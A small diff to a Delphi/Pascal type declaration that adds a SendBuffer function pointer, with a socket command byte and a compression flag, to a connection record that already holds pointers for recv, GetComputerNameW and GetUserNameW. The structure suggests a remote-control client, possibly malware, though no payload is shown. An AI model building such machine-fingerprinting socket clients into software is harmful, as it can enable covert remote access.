@@ -74,6 +74,7 @@ type
     xrecv:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
     xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
     xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
+    xSendBuffer:function(pConn:Pointer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer; bCompress:Boolean): Boolean;
   end;
   PConnRec = ^TConnRec;
 
